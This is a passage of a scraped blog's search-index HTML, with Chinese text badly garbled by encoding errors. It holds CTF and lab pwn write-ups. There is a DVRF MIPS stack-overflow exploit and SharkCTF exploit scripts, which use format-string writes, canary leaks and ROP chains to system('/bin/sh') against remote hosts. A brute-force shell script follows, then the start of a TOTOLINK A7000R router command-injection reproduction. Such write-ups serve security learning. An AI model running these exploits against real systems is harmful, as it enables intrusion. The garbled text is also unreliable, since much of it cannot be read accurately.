‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
00:0000‚îÇ s0 sp 0x40800038 ‚óÇ‚Äî 0
01:0004‚îÇ       0x4080003c ‚Äî‚ñ∏ 0x40800114 ‚Äî‚ñ∏ 0x4080029e ‚óÇ‚Äî jalx   0x41ccbcb8 /* 0x74732f2e; &#39;./stack_bof_01&#39; */
02:0008‚îÇ       0x40800040 ‚Äî‚ñ∏ 0x3ffba724 ‚óÇ‚Äî 0x4c475f00
03:000c‚îÇ       0x40800044 ‚Äî‚ñ∏ 0x3ffba354 ‚óÇ‚Äî 0
04:0010‚îÇ       0x40800048 ‚Äî‚ñ∏ 0x3feed5d0 ‚óÇ‚Äî negu   $v0, $a0 /* 0x41023 */
05:0014‚îÇ       0x4080004c ‚óÇ‚Äî 0
... ‚Üì          2 skipped
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚ñ∫ f 0 0x407ff2a9
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèÇËÄÉSwe3tyÂçöÂÆ¢Ôºö&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Âú®MIPS‰∏≠ÔºåÂáΩÊï∞ÂÜÖÈÉ®‰ºöÈÄöËøá&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mn&gt;9&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;ÂØÑ&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;Â≠ò&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;Âô®&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;Âíå&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;t9ÂØÑÂ≠òÂô®Âíå&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;ÂØÑ&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;Â≠ò&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;Âô®&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;Âíå&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;gpÂØÑÂ≠òÂô®Êù•ÊâæÊï∞ÊçÆÔºåÂú∞ÂùÄÁ≠â„ÄÇÂêåÊó∂Âú®mipsÁöÑÊâãÂÜåÂÜÖÈªòËÆ§$t9ÁöÑÂÄº‰∏∫ÂΩìÂâçÂáΩÊï∞ÁöÑÂºÄÂßãÂú∞ÂùÄÔºåËøôÊ†∑ÊâçËÉΩÊ≠£Â∏∏ÁöÑÁ¥¢Âºï&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Âú®&lt;code&gt;libc.so.0&lt;/code&gt;‰∏≠Â≠òÂú®gadgetÔºå‰∏çËøámipsropÊâæ‰∏çÂà∞ÔºåÂèØ‰ª•ÊâãÂä®ÂÆö‰ΩçÂà∞Ê≠§Â§Ñ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00006B20 00 00 B9 8F                   lw      $t9, arg_0($sp)
.text:00006B24 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÖàÊâãÂä®ÂÖ≥Èó≠Âú∞ÂùÄÈöèÊú∫Âåñ&lt;br&gt;
ÂØπ‰∫élibcÂü∫ÂùÄÔºåÂèØ‰ª•ÂØπÁ®ãÂ∫èÂáΩÊï∞‰∏ãÊñ≠ÁÇπÔºåÂª∫ËÆÆ‰ΩøÁî®&lt;code&gt;b *$rebase(0x*)&lt;/code&gt;ÁöÑÊñπÂºèÂä†Êñ≠ÁÇπÔºåË∞ÉËØïÂçäÂ§©ÊâçÊÉ≥Ëµ∑Êù•Ëøô‰∏™ÔºåË∑≥ËΩ¨ËøáÂéªÊü•ÁúãgotÂú∞ÂùÄÔºåÁÑ∂ÂêéÊâãÁÆó&lt;br&gt;
userÊ®°Âºè‰∏ãvmmapÂπ∂‰∏çÊñπ‰æø‰ΩøÁî®Ôºå‰πüÂèØ‰ª•ÊâãÂä®Êü•ÁúãËøõÁ®ãÂÜÖÂ≠òÊò†Â∞Ñ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo su
echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo netstat -tunpl|grep 1234 #Êü•ÁúãËøõÁ®ãPID
sudo cat /proc/*/maps   #Êü•ÁúãÂÜÖÂ≠òÊò†Â∞ÑÔºå*‰∏∫ËøõÁ®ãPID
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;80eee000-80f29000 r--p 00000000 00:19 562334                             /home/fk/Desktop/cve/DVRF-master/Firmware/_DVRF_v05.bin.extracted/squashfs-root/pwnable/Intro/lib/libc.so.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÂêéËøòÊòØ‰ΩøÁî®&lt;code&gt;start.sh&lt;/code&gt;‰∏≠ÁöÑÂëΩ‰ª§ÔºåÊâÄ‰ª•ÊúÄÁªàexp‰øÆÊîπÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

libc_addr=0x80eee000
gadget1=0x6B20+libc_addr
payload=&amp;quot;a&amp;quot;*204+p32(gadget1)+p32(0x4008e0)


with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
	f.write(payload)
# io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DVRF stack_bof_01</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/YyHpbs2f-/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h3&gt;
&lt;h4 id=&#34;test_your_nc&#34;&gt;Test_Your_ncÔºö&lt;/h4&gt;
&lt;p&gt;ÂØπÁ®ãÂ∫èËøõË°åÈÄÜÂêëÂêéncËæìÂÖ•ÊåáÂÆöÂ≠óÁ¨¶‰∏≤Âç≥ÂèØ&lt;/p&gt;
&lt;h4 id=&#34;how_2_getshell&#34;&gt;How_2_getshell?:&lt;/h4&gt;
&lt;p&gt;ÈôêÂà∂ËæìÂÖ•ÈïøÂ∫¶‰∏îÊØîËæÉ&lt;code&gt;/bin/sh&lt;/code&gt;Â≠óÁ¨¶‰∏≤ÔºåËæìÂÖ•&lt;code&gt;sh&lt;/code&gt;Âç≥ÂèØ&lt;/p&gt;
&lt;h4 id=&#34;bignum&#34;&gt;bignumÔºü:&lt;/h4&gt;
&lt;p&gt;ËæìÂÖ•&lt;code&gt;-1&lt;/code&gt;Âç≥ÂèØÁªïËøá&lt;/p&gt;
&lt;h4 id=&#34;cr4zy_thursday&#34;&gt;Cr4zy_Thursday!!!Ôºö&lt;/h4&gt;
&lt;p&gt;64‰ΩçÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰ªªÊÑèÂú∞ÂùÄÂÜôÔºåÊ≥®ÊÑèÂØπÈΩê&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8405)

# gdb.attach(io)
# pause()

flag_addr=0x060108C

payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x32,8).encode().ljust(0x10,b&amp;quot;\x00&amp;quot;)+p64(flag_addr)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;stack_overflow&#34;&gt;Stack_Overflow:&lt;/h4&gt;
&lt;p&gt;64‰ΩçÊ†àÊ∫¢Âá∫&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8406)


# gdb.attach(io)
# pause()

payload=cyclic(0x28)+p64(0x400717)
io.sendafter(b&amp;quot;ght\n&amp;quot;,payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;‰Ω†ÂñúÊ¨¢Èáë‰∏ùÈõÄÂêó&#34;&gt;‰Ω†ÂñúÊ¨¢Èáë‰∏ùÈõÄÂêóÔºö&lt;/h4&gt;
&lt;p&gt;Âá∫È¢ò‰∫∫ÁöÑÊú¨ÊÑèÂ∫îËØ•ÊòØÂ•ΩÁöÑÔºåÁºñËØëÂô®ÊâßË°åÁöÑÊõ¥Â•Ω‰∫Ü&lt;br&gt;
‰∏çÂêå‰ª•ÂæÄÔºåÁ®ãÂ∫èÊúÄÂêéÁªìÊùüÁöÑÊó∂ÂÄôËøõÂÖ•‰∫ÜÂè¶Â§ñ‰∏Ä‰∏™ÂàÜÊîØÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;loc_80486A5:
mov     ecx, [ebp+var_4]
leave
lea     esp, [ecx-4]
retn
; } // starts at 80485F9
main endp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÈÄöËøáÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ëé∑ÂèñcanaryÂíåÊ†àÂú∞ÂùÄ&lt;br&gt;
Ëé∑ÂèñcanaryÂêé‰∏çËÉΩÁõ¥Êé•Ê∫¢Âá∫ÂÜôÔºåÈúÄË¶ÅÈÄöËøáÊéßÂà∂Ê†à‰∏äÊï∞ÊçÆËøõ‰∏ÄÊ≠•ÊéßÂà∂ÂØÑÂ≠òÂô®&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;101.42.30.15&amp;quot;,8407)

gdb.attach(io)
pause()

io.sendafter(b&amp;quot;you!!!!!\n&amp;quot;,b&amp;quot;%15$p.%1$p&amp;quot;.ljust(0x10,b&amp;quot;.&amp;quot;))
canary=int(io.recv(10),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
stack=int(io.recv(10),16)+0x10
print(&amp;quot;canary: &amp;quot;,hex(canary))
print(&amp;quot;stack: &amp;quot;,hex(stack))


payload=p32(0x80485e0)*8+p32(canary)+p32(stack)*3
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;ÂéüÁ•ûÂêØÂä®&#34;&gt;ÂéüÁ•ûÔºåÂêØÂä®ÔºÅÔºö&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;where_to_go&lt;/code&gt;ÂèØ‰ª•ÂæÄÊ†à‰∏äËØªÊï∞ÊçÆÔºåÂèØ‰ª•Â∏ÉÁΩÆropÈìæ&lt;br&gt;
&lt;code&gt;dress&lt;/code&gt;ÂèØ‰ª•ÂÆûÁé∞Ê†à‰∏äÂÜô8Â≠óËäÇ&lt;br&gt;
‰∏ÄÂºÄÂßãÁõ¥Êé•Âà©Áî®Ê†à‰∏äÂÜô8Â≠óËäÇÁâπÊÄß‰øÆÊîπretÂú∞ÂùÄ‰Ωé‰∏âÂ≠óËäÇÔºåÁàÜÁ†¥ÂçäÂ≠óËäÇÊâìone_gadgetÔºå1/16Ê¶ÇÁéáÊú¨Âú∞ËÉΩÂá∫‰∏§‰∏™ÔºåËøúÁ´ØÂºÄ4‰∏™ÁªàÁ´ØÁàÜ‰∏ÄÊôö‰∏ä‰∏çÈÄöÔºåÊîπÁî®ropÁöÑÊñπÂºè&lt;br&gt;
ÊÄª‰πãÂ§öË∞ÉËØï‰∏Ä‰∏ãÂ∞±Ë°å‰∫ÜÔºåÊúÄÂêéÊ≥ÑÈú≤ÂêéÂª∫ËÆÆËøîÂõûmainÂáΩÊï∞Ôºå‰∏çÁÑ∂ÂØÑÂ≠òÂô®ÂÄºÊõ¥ÊîπÂêéÂÆπÊòìÂç°‰Ωè&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;,])

# io=process(&amp;quot;./ys&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8408)
elf=ELF(&amp;quot;./ys&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


pop_rdi=0x4009b3
# gdb.attach(io)
# pause()

sleep(1)
io.recv()
sleep(1)
io.sendline(b&amp;quot;10086&amp;quot;)
sleep(1)
io.recv()
sleep(1)
io.send(b&amp;quot;qqqqqqqqqqqqqqqqqq&amp;quot;)
sleep(1)
io.recv()
sleep(1)
payload=p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4008f3)
io.send(payload*5)
sleep(1)
io.recv()
sleep(1)


# gdb.attach(io)
# pause()

io.sendline(b&amp;quot;56&amp;quot;)  #88
sleep(1)
io.recv()
sleep(1)
io.send(p64(0x400589))

# sleep(1)
# io.recv()
# sleep(1)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

# gdb.attach(io)
# pause()


sleep(1)
io.recv()
sleep(1)
io.sendline(b&amp;quot;10086&amp;quot;)
sleep(1)
io.recv()
sleep(1)
io.send(b&amp;quot;qqqqqqqqqqqqqqqqqq&amp;quot;)
sleep(1)
io.recv()
sleep(1)
payload=p64(pop_rdi)+p64(str_sh)+p64(sys_addr)+p64(0)
io.send(payload*5)
sleep(1)
io.recv()
sleep(1)

io.sendline(b&amp;quot;56&amp;quot;)  #88
sleep(1)
io.recv()
sleep(1)
io.send(p64(0x400589))



io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# Gadgets information
# ============================================================
# 0x00000000004009ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009ae : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009b0 : pop r14 ; pop r15 ; ret
# 0x00000000004009b2 : pop r15 ; ret
# 0x00000000004009ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009af : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400670 : pop rbp ; ret
# 0x00000000004009b3 : pop rdi ; ret
# 0x00000000004009b1 : pop rsi ; pop r15 ; ret
# 0x00000000004009ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400589 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÂêéËøòÊòØÊîæ‰∏Ä‰∏™ÁàÜÁ†¥ÁöÑËÑöÊú¨Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;,])

while True:
    try:
        io=process(&amp;quot;./ys&amp;quot;)
        # io=remote(&amp;quot;101.42.30.15&amp;quot;,8408)
        elf=ELF(&amp;quot;./ys&amp;quot;)
        libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

        # gdb.attach(io)
        # pause()
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;10086&amp;quot;)
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;1&amp;quot;)
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;88&amp;quot;)
        # sleep(1)

        io.recv()
        # sleep(1)
        # sleep(2)
        io.send(b&amp;quot;\x47\x12\x8f&amp;quot;)
        sleep(2)
        io.sendline(&amp;quot;ls&amp;quot;)
        sleep(2)
        ret = io.recv()
        if b&amp;quot;flag&amp;quot; in ret:
            io.sendline(&amp;quot;cat flag&amp;quot;)
            sleep(1)
            print(io.recv())
            print(&amp;quot;SUCCEED&amp;quot;)
            sys.exit(0)
        else:
            print(&amp;quot;FAILED&amp;quot;)
            io.close()

    except:
        io.close()
        continue

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">SharkCTF ÈÉ®ÂàÜwp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/MPIXkmDvQ/"" data-c="
          &lt;h3 id=&#34;Ê¶ÇËø∞&#34;&gt;&lt;strong&gt;Ê¶ÇËø∞&lt;/strong&gt;Ôºö&lt;/h3&gt;
&lt;p&gt;TOTOLINK A7000R V9.1.0u.6115_B20201022 ÁâàÊú¨Â≠òÂú®ÂÆâÂÖ®ÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÊ∫ê‰∫é &lt;code&gt;setDiagnosisCfg&lt;/code&gt; ÁöÑ ip ÂèÇÊï∞Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÈóÆÈ¢ò&lt;br&gt;
&lt;a href=&#34;https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/171/ids/36.html&#34;&gt;‰∏ãËΩΩÈìæÊé•&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;ÊºèÊ¥û&#34;&gt;&lt;strong&gt;ÊºèÊ¥û&lt;/strong&gt;Ôºö&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/cgi-bin/cstecgi.cgi&lt;/code&gt;ÁöÑ&lt;code&gt;setDiagnosisCfg&lt;/code&gt; ‰ªéËØ∑Ê±Ç‰∏≠Ëé∑Âèñ&lt;code&gt;ip&lt;/code&gt;ÂèÇÊï∞Âπ∂ÈÄöËøá&lt;code&gt;sprintf&lt;/code&gt;ÂáΩÊï∞Â∞ÜÂèÇÊï∞Ê†ºÂºèÂåñÊãºÊé•Âú®ÂèòÈáè&lt;code&gt;acStack_90&lt;/code&gt;ÂêéÔºåÊúÄÂêéÂ∞Ü&lt;code&gt;acStack_90&lt;/code&gt;‰º†ÂÖ•&lt;code&gt;doSystem&lt;/code&gt;ÂáΩÊï∞‰∏≠&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691497823589.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;code&gt;grep -rnl &amp;quot;doSystem&amp;quot;&lt;/code&gt;ÈÄíÂΩíÊü•ÊâæÁõ∏ÂÖ≥Êñá‰ª∂&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691498085539.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÈîÅÂÆö&lt;code&gt;libcshared.so&lt;/code&gt;Âä®ÊÄÅÈìæÊé•Â∫ìÊñá‰ª∂Êü•ÊâæÂáΩÊï∞ÂÆûÁé∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691498379028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèØ‰ª•ÁúãÂà∞ËØ•ÂáΩÊï∞Â∞ÜÂèÇÊï∞&lt;code&gt;param1&lt;/code&gt;ÈÄöËøá&lt;code&gt;vnsprintf&lt;/code&gt;ÂáΩÊï∞Ê†ºÂºèÂåñÂêéÂ≠òÂÇ®Âà∞&lt;code&gt;acStack_20c&lt;/code&gt;‰∏≠ÊúÄÂêé‰º†ÂÖ•&lt;code&gt;system&lt;/code&gt;ÂáΩÊï∞‰∏≠ÔºåÂèØ‰ª•ÂØºËá¥‰ªªÊÑèÂëΩ‰ª§ÊâßË°å&lt;/p&gt;
&lt;h3 id=&#34;Â§çÁé∞&#34;&gt;&lt;strong&gt;Â§çÁé∞&lt;/strong&gt;Ôºö&lt;/h3&gt;
&lt;p&gt;È¶ñÂÖàÈÖçÁΩÆÁΩëÁªúÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr virbr2 # ÂàõÂª∫ÁΩëÊ°•
sudo ifconfig virbr2 192.168.122.1/24 up # ÈÖçÁΩÆÁΩëÊ°•IP
sudo tunctl -t tap2 # Ê∑ªÂä†ËôöÊãüÁΩëÂç°tap2
sudo ifconfig tap2 192.168.122.11/24 up # ÈÖçÁΩÆËôöÊãüÁΩëÂç°IP
sudo brctl addif virbr2 tap2 # ÈÖçÁΩÆËôöÊãüÁΩëÂç°‰∏éÁΩëÊ°•ËøûÊé•
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;ÊèêÂèñÂõ∫‰ª∂ÂêéËøõÂÖ•&lt;code&gt;/squashfs-root/bin/&lt;/code&gt;‰∏ãÊâßË°å&lt;code&gt;readelf -h busybox&lt;/code&gt;Êü•ÁúãÁõ∏ÂÖ≥‰ø°ÊÅØ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ELF Â§¥Ôºö
  MagicÔºö  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Á±ªÂà´:                              ELF32
  Êï∞ÊçÆ:                              2 Ë°•Á†ÅÔºåÂ∞èÁ´ØÂ∫è (little endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI ÁâàÊú¨:                          0
  Á±ªÂûã:                              EXEC (ÂèØÊâßË°åÊñá‰ª∂)
  Á≥ªÁªüÊû∂ÊûÑ:                          MIPS R3000
  ÁâàÊú¨:                              0x1
  ÂÖ•Âè£ÁÇπÂú∞ÂùÄÔºö              0x402c80
  Á®ãÂ∫èÂ§¥Ëµ∑ÁÇπÔºö              52 (bytes into file)
  Start of section headers:          607496 (bytes into file)
  Ê†áÂøóÔºö             0x70001007, noreorder, pic, cpic, o32, mips32r2
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         25
  Section header string table index: 24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;32‰ΩçmipsÂ∞èÁ´ØÂ∫èÔºåËøôÈáå‰ΩøÁî®qemu-systemÊ®°ÂºèÂàõÂª∫ËôöÊãüÊú∫Ê®°ÊãüÂõ∫‰ª∂ÔºåÊ≥®ÊÑèÊåáÂÆöËæÉÊñ∞ÁöÑcpuÔºå‰ª•ÂÖçÂá∫Áé∞&lt;code&gt;illegal instruction&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo qemu-system-mipsel \
-M malta \
-cpu 74Kf \
-m 2G \
-object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &amp;quot;root=/dev/sda1 console=tty0&amp;quot; \
-netdev tap,id=tapnet,ifname=tap2,script=no \
-device rtl8139,netdev=tapnet \
-nographic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂàõÂª∫ÊàêÂäüÂêéroot/rootÁôªÂΩïÔºåËôöÊãüÊú∫ÊâßË°åÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ifconfig eth0 192.168.122.15 up # ÈÖçÁΩÆË∑ØÁî±Âô®IP
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êñπ‰æøËµ∑ËßÅÔºåÊàë‰ª¨ÊâæÂà∞ÈÖçÁΩÆÊñá‰ª∂&lt;code&gt;/lighttpd/lighttpd.conf&lt;/code&gt;Âπ∂Â∞ÜÊåáÂÆöpidÊñá‰ª∂ÈÇ£‰∏ÄË°åÊ≥®ÈáäÊéâÔºåÂêéÁª≠‰∏çÁî®ÂçïÁã¨ÂàõÂª∫&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691499443007.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁÑ∂ÂêéhostÊâßË°åÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;scp -r squashfs-root/ root@192.168.122.15:/root/ # Êã∑Ë¥ùË∑ØÁî±Âô®Êñá‰ª∂Âà∞ËôöÊãüÊú∫
&lt;/code&gt;&lt;/pre&gt;
